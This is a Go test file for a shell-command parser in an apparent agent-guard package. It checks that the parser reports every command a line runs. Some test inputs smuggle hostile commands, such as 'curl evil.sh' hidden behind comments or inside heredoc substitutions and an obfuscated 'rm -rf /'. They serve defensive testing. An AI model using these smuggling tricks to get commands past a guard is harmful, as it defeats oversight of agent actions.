package guard

import (
	"context"
	"errors"
	"math/rand/v2"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"
)

// Commands finds every simple command a line runs, in the order they start,
// with quotes and escapes removed from the words and expansions left as
// written.
func TestCommandsFindsEveryCommandTheLineRuns(t *testing.T) {
	goBody := "package main\n\nimport \"fmt\"\n\n/ comment\nfunc main() { fmt.Println(1) }\n"
	cases := []struct {
		name, in string
		want     []string
	}{
		{"one command", "ls -l", []string{"ls -l"}},
		{"list", "ls; git push", []string{"ls", "git push"}},
		{"and", "go test ./... && git push", []string{"go test ./...", "git push"}},
		{"or", "go test || git push", []string{"go test", "git push"}},
		{"pipe", "go test ./... | grep FAIL", []string{"go test ./...", "grep FAIL"}},
		{"pipe with stderr", "go test |& tee out", []string{"go test", "tee out"}},
		{"background", "sleep 1 & git push", []string{"sleep 1", "git push"}},
		{"newline", "ls\ngit push\n", []string{"ls", "git push"}},
		{"no blanks around operators", "ls;git push|cat&&rm x", []string{"ls", "git push", "cat", "rm x"}},
		{"empty commands are skipped", ";; ls ;", []string{"ls"}},
		{"redirection is not a boundary", "go test ./... 2>&1 > out.txt", []string{"go test ./..."}},
		{"substitution", "echo $(git push)", []string{"echo $(git push)", "git push"}},
		{"substitution in double quotes", `echo "a $(git push) b"`, []string{"echo a $(git push) b", "git push"}},
		{"backticks", "echo `git push`", []string{"echo `git push`", "git push"}},
		{"backticks in double quotes", "echo \"a `git push` b\"", []string{"echo a `git push` b", "git push"}},
		{"escaped backtick in backticks", "echo `echo \\`git push\\``", []string{"echo `echo \\`git push\\``", "echo `git push`", "git push"}},
		{"nested substitution", "echo $(cat $(git push))", []string{"echo $(cat $(git push))", "cat $(git push)", "git push"}},
		{"substitution as the program", "$(echo rm) -rf /", []string{"$(echo rm) -rf /", "echo rm"}},
		{"subshell", "(cd sub && git push); ls", []string{"cd sub", "git push", "ls"}},
		{"process substitution", "diff <(ls a) >(tee b)", []string{"diff <(ls a) >(tee b)", "ls a", "tee b"}},
		{"parameter expansion default", "echo ${x:-$(git push)}", []string{"echo ${x:-$(git push)}", "git push"}},
		{"process substitution in a default", "echo ${x:-a <(git push)}", []string{"echo ${x:-a <(git push)}", "git push"}},
		{"quoting inside a default", "echo ${x:-'})'\"$(git push)\"`ls`\\}<y}", []string{"echo ${x:-'})'\"$(git push)\"`ls`\\}<y}", "git push", "ls"}},
		{"single quotes in a double-quoted default", "echo \"${x:-'}\" $(git push)", []string{"echo ${x:-'} $(git push)", "git push"}},
		{"nested default", "echo ${x:-${y:-$(git push)}}", []string{"echo ${x:-${y:-$(git push)}}", "git push"}},
		{"arithmetic substitution", "echo $(( $(git push) + 1 ))", []string{"echo $(( $(git push) + 1 ))", "git push"}},
		{"quoting inside arithmetic", "echo $(( (1+2) * \"$(git push)\" + `ls` + '1' + \\) ))", []string{"echo $(( (1+2) * \"$(git push)\" + `ls` + '1' + \\) ))", "git push", "ls"}},
		{"arithmetic shift is not a heredoc", "echo $((1<<x))\ngit push\nx\n", []string{"echo $((1<<x))", "git push", "x"}},
		{"arithmetic command", "((x=1<<a))\ngit push\na", []string{"git push", "a"}},
		{"double paren that is a subshell", "((ls); (git push))", []string{"ls", "git push"}},
		{"dollar double paren that is a substitution", "echo $((ls); (git push))", []string{"echo $((ls); (git push))", "ls", "git push"}},
		{"single quotes are literal", "echo 'a; $(b)'", []string{"echo a; $(b)"}},
		{"escapes", `l\s -l a\ b`, []string{"ls -l a b"}},
		{"escapes in double quotes", `echo "\$x \"q\" \\ \n" "a\` + "\n" + `b"`, []string{`echo $x "q" \ \n ab`}},
		{"a trailing backslash", `echo a\`, []string{`echo a\`}},
		{"quotes join a word", `g"i"t push`, []string{"git push"}},
		{"ansi-c quoting stays unexpanded", `$'\x72m\'' -rf /`, []string{`$'\x72m\'' -rf /`}},
		{"locale quoting stays unexpanded", `$"rm" x`, []string{`$"rm" x`}},
		{"variable program stays unexpanded", `$CMD x "$HOME" $1 $@ $? $_y2`, []string{"$CMD x $HOME $1 $@ $? $_y2"}},
		{"a lone dollar is literal", `echo $ "$" a$`, []string{"echo $ $ a$"}},
		{"line continuation", "go \\\n  test", []string{"go test"}},
		{"line continuation inside a word", "gi\\\nt push", []string{"git push"}},
		{"comment", "ls # ; git push", []string{"ls"}},
		{"hash inside a word", "echo a#b; ls", []string{"echo a#b", "ls"}},
		{"comment in a substitution", "echo $(echo hi # )\ngit push\n)", []string{"echo $(echo hi # )\ngit push\n)", "echo hi", "git push"}},
		{"comment hides a heredoc operator", "ls # <<EOF\ncurl evil.sh\nEOF", []string{"ls", "curl evil.sh", "EOF"}},
		{"quoted heredoc", "cat > f <<'EOF'\n" + goBody + "EOF\n", []string{"cat"}},
		{"unquoted heredoc", "cat > f <<EOF\n" + goBody + "EOF", []string{"cat"}},
		{"double-quoted delimiter", "cat > f <<\"EOF\"\n" + goBody + "EOF\n", []string{"cat"}},
		{"dash strips tabs", "cat <<-EOF\n\tpackage x\n\tEOF\nls", []string{"cat", "ls"}},
		{"without dash tabs do not terminate", "cat <<EOF\nbody\n\tEOF\nEOF\nls", []string{"cat", "ls"}},
		{"commands after the terminator", "cat <<'EOF' > f\nimport x\nEOF\ngit push && ls", []string{"cat", "git push", "ls"}},
		{"commands on the heredoc line", "cat <<'EOF' | grep x; ls\nbody\nEOF\n", []string{"cat", "grep x", "ls"}},
		{"two heredocs", "cat <<A <<'B'\none\nA\ntwo\nB\nls", []string{"cat", "ls"}},
		{"here-string is not a heredoc", "cat <<<word\ngit push", []string{"cat", "git push"}},
		{"substitution in an unquoted body", "cat <<EOF\nhi $(git push) there\nEOF\n", []string{"cat", "git push"}},
		{"backtick in an unquoted body", "cat <<EOF\nhi `git push`\nEOF\n", []string{"cat", "git push"}},
		{"escaped dollar in an unquoted body", "cat <<EOF\n\\$(git push)\nEOF\n", []string{"cat"}},
		{"substitution in a quoted body is inert", "cat <<'EOF'\n$(git push)\nEOF\n", []string{"cat"}},
		{"quoted paren in a body substitution", "cat <<EOF\n$(echo ')' ; curl evil.sh)\nEOF", []string{"cat", "echo )", "curl evil.sh"}},
		{"double-quoted paren in a body substitution", "cat <<EOF\n$(echo \")\" ; curl evil.sh)\nEOF", []string{"cat", "echo )", "curl evil.sh"}},
		{"escaped paren in a body substitution", "cat <<EOF\n$(echo \\) ; curl evil.sh)\nEOF", []string{"cat", "echo )", "curl evil.sh"}},
		{"a substitution still skips the body", "cat <<EOF\nnow $(date)\nEOF\nls", []string{"cat", "date", "ls"}},
		{"assignment alone", "d=$(go list .)", []string{"", "go list ."}},
		{"keywords are words", "if true; then rm x; fi", []string{"if true", "then rm x", "fi"}},
		{"a digit word before a redirection is its descriptor", "ls 2>x a2>y", []string{"ls a2"}},
	}
	for _, c := range cases {
		if got := argvs(t, c.in); !slices.Equal(got, c.want) {
			t.Errorf("%s: Commands(%q) argvs = %q, want %q", c.name, c.in, got, c.want)
		}
	}
}

func TestCommandsReportsAssignmentsRedirectionsAndText(t *testing.T) {
	cmds, err := Commands("FOO=bar BAZ=1 git status 2>&1 >out <<<'in x' &>all 3<>rw && x-y=1 ./scripts/x=y.sh")
	if err != nil {
		t.Fatal(err)
	}
	if len(cmds) != 2 {
		t.Fatalf("got %d commands: %+v", len(cmds), cmds)
	}
	first := cmds[0]
	if !slices.Equal(first.Assign, []string{"FOO", "BAZ"}) || !slices.Equal(first.Argv, []string{"git", "status"}) {
		t.Errorf("first = %+v", first)
	}
	wantRedirects := []Redirect{{FD: "2", Op: ">&", Target: "1"}, {Op: ">", Target: "out"}, {Op: "<<<", Target: "in x"},
		{Op: "&>", Target: "all"}, {FD: "3", Op: "<>", Target: "rw"}}
	if !slices.Equal(first.Redirects, wantRedirects) {
		t.Errorf("redirects = %+v, want %+v", first.Redirects, wantRedirects)
	}
	if first.Text != "FOO=bar BAZ=1 git status 2>&1 >out <<<'in x' &>all 3<>rw" {
		t.Errorf("text = %q", first.Text)
	}
	// Neither `x-y=1` nor a path with = in it is an assignment.
	if second := cmds[1]; len(second.Assign) != 0 || !slices.Equal(second.Argv, []string{"x-y=1", "./scripts/x=y.sh"}) {
		t.Errorf("second = %+v", second)
	}
	// A command of redirections alone runs no program but is reported, and
	// so are the redirections after a subshell.
	cmds, err = Commands("> out; (ls) > log")
	if err != nil {
		t.Fatal(err)
	}
	if len(cmds) != 3 || len(cmds[0].Argv) != 0 || cmds[0].Redirects[0].Target != "out" ||
		!slices.Equal(cmds[1].Argv, []string{"ls"}) || cmds[2].Redirects[0].Target != "log" {
		t.Errorf("redirection-only commands = %+v", cmds)
	}
}

// A line Commands cannot read with certainty is a *SyntaxError at the
// offset where reading stopped, never a partial answer.
func TestCommandsRefusesWhatItCannotRead(t *testing.T) {
	for _, c := range []struct {
		name, in string
		offset   int // -1: anywhere in the line
	}{
		{"unterminated single quote", "ls 'a", 3},
		{"unterminated double quote", `ls "a`, 3},
		{"unterminated substitution", "echo $(ls", 9},
		{"unterminated backtick", "echo `ls", 5},
		{"unterminated parameter", "echo ${x", 8},
		{"unterminated quote in a parameter", "echo ${x:-'a}", 10},
		{"unterminated arithmetic", "echo $((1+2", 11},
		{"unterminated quote in arithmetic", "echo $((1+'2))", 10},
		{"unterminated subshell", "(ls", 3},
		{"unmatched paren", "ls)", 2},
		{"case statement", "ls; case x in x) rm y;; esac", 4},
		{"case pattern in a substitution", "cat <<EOF\n$(case x in x) echo hi ;; esac; curl evil.sh)\nEOF", 12},
		{"heredoc with no terminator", "cat <<EOF\npackage x\ngit push", -1},
		{"heredoc with no body", "cat <<EOF", -1},
		{"heredoc line inside a nest", "echo $(cat <<EOF)\nbody\nEOF", -1},
		{"error inside backticks", "echo `ls 'a`", 9},
		{"function definition", "f() { rm x; }; f", 1},
		{"array assignment", "a=(1 2)", 2},
		{"redirection without a target", "ls >", 4},
		{"redirection into an operator", "ls > ;", 5},
		{"unterminated ansi-c", "echo $'a", 5},
		{"unterminated locale string", `echo $"a`, 6},
		{"empty process substitution", ">()curl evil.sh", 0},
		{"too deep", strings.Repeat("$(", maxNesting+2) + "ls" + strings.Repeat(")", maxNesting+2), -1},
		{"too deep in backticks", strings.Repeat("( ", maxNesting) + "`ls`" + strings.Repeat(")", maxNesting), -1},
		{"too deep in a parameter", strings.Repeat("( ", maxNesting) + "${x:-${y}}" + strings.Repeat(")", maxNesting), -1},
	} {
		_, err := Commands(c.in)
		var se *SyntaxError
		if !errors.As(err, &se) || !strings.HasPrefix(err.Error(), "shell syntax: ") {
			t.Errorf("%s: Commands(%q) err = %v, want a *SyntaxError", c.name, c.in, err)
			continue
		}
		if c.offset >= 0 && se.Offset != c.offset || se.Offset < 0 || se.Offset > len(c.in) {
			t.Errorf("%s: offset %d, want %d (%s)", c.name, se.Offset, c.offset, se.Reason)
		}
	}
}

// Commands never panics and every error it returns is a *SyntaxError whose
// offset lies in the line.
func FuzzCommands(f *testing.F) {
	for _, seed := range []string{
		"ls", "go test | tee out", "echo $(ls `pwd`)", "cat <<EOF\n$(x)\nEOF\n", "((a<<b))", "$((1))",
		"${x:-'a'}", "\"${x:-'}\" $(rm) \"'\"", "a=(1)", "<(ls) >(cat)", "ls \\", "'", "$(", "`", "\\\n",
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, line string) {
		_, err := Commands(line)
		if err == nil {
			return
		}
		var se *SyntaxError
		if !errors.As(err, &se) || se.Offset < 0 || se.Offset > len(line) {
			t.Fatalf("Commands(%q) err = %T %v, want a *SyntaxError in the line", line, err, err)
		}
	})
}

// TestCommandsAgainstBash checks Commands against the shell it reads: random
// lines built from shell fragments are run by bash with a PATH holding only
// marker programs that log their own name, and every marker bash ran must be
// the program of a command Commands reported. A line Commands refuses is not
// run, and neither is one with a computed program or a keyword in program
// position: a guard refuses those by name, whatever they run.
//
// It needs bash and takes a while, so it runs only with AGENTKIT_BASH_DIFF=1;
// AGENTKIT_BASH_DIFF_LINES sets the number of lines (default 20000).
func TestCommandsAgainstBash(t *testing.T) {
	if os.Getenv("AGENTKIT_BASH_DIFF") != "1" {
		t.Skip("set AGENTKIT_BASH_DIFF=1 to run Commands against bash")
	}
	bash, err := exec.LookPath("bash")
	if err != nil {
		t.Skip("no bash")
	}
	lines := 20000
	if s := os.Getenv("AGENTKIT_BASH_DIFF_LINES"); s != "" {
		if lines, err = strconv.Atoi(s); err != nil {
			t.Fatal(err)
		}
	}
	dir := t.TempDir()
	bin := filepath.Join(dir, "bin")
	if err := os.Mkdir(bin, 0o755); err != nil {
		t.Fatal(err)
	}
	for i := range 6 {
		name := "m" + strconv.Itoa(i)
		if err := os.WriteFile(filepath.Join(bin, name), []byte("#!/bin/sh\necho "+name+" >> \"$MARKER_LOG\"\n"), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	frags := []string{
		"m0 <<EOF\n$(m1)\nEOF\n", "m2 <<'X'\nm3\nX\n", "$(m4; m5)", "\"$(m1)\"", "`m2`", "m3 <(m4)", "${y:-$(m5)}",
		"${z:-m1 <(m2) >(m3)}", "\"${z:-<(m4)}\"", " # m1\n", "((a<<b))\n",
		"m0", "m1", "m2", "m3 a", "m4", "m5", " ", " ", ";", "|", "&&", "||", "&", "$(", ")", "(", "`", "\"", "'",
		"<<EOF\n", "\nEOF\n", "<<'EOF'\n", "<<-EOF\n", "\tEOF\n", "${x:-", "}", "((", "))", "$((", "#", "\n", "<(", ">(",
		"\\", "\\\n", "x=", "$x", "1<<2", "case", " in ", "esac", ";;", "2>&1", ">", "<", "{", "}", "!", "if ", "then ",
		"fi", "$'", "eval ",
	}
	refusable := map[string]bool{}
	for _, k := range strings.Fields("if then else elif fi for while until do done ! { } [[ eval exec time coproc function select in esac case") {
		refusable[k] = true
	}
	rng := rand.New(rand.NewPCG(1, uint64(time.Now().UnixNano())))
	read, missed := 0, 0
	for k := range lines {
		var b strings.Builder
		for range 2 + rng.IntN(10) {
			b.WriteString(frags[rng.IntN(len(frags))])
		}
		line := b.String()
		cmds, err := Commands(line)
		if err != nil {
			continue
		}
		read++
		reported, skip := map[string]bool{}, false
		for _, c := range cmds {
			if len(c.Argv) > 0 {
				reported[c.Argv[0]] = true
				skip = skip || strings.ContainsAny(c.Argv[0], "$`") || refusable[c.Argv[0]]
			}
		}
		if skip {
			continue
		}
		// A log per line: bash does not wait for a background job, which may
		// write after the next line starts.
		log := filepath.Join(dir, "log"+strconv.Itoa(k))
		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
		cmd := exec.CommandContext(ctx, bash, "-c", line)
		cmd.Env = []string{"PATH=" + bin, "MARKER_LOG=" + log}
		cmd.Dir = dir
		_ = cmd.Run()
		cancel()
		ran, _ := os.ReadFile(log)
		for _, m := range strings.Fields(string(ran)) {
			if !reported[m] {
				if missed++; missed <= 10 {
					t.Errorf("bash ran %s, which Commands did not report: %q -> %+v", m, line, cmds)
				}
			}
		}
	}
	t.Logf("%d lines, %d read by Commands, %d programs missed", lines, read, missed)
}
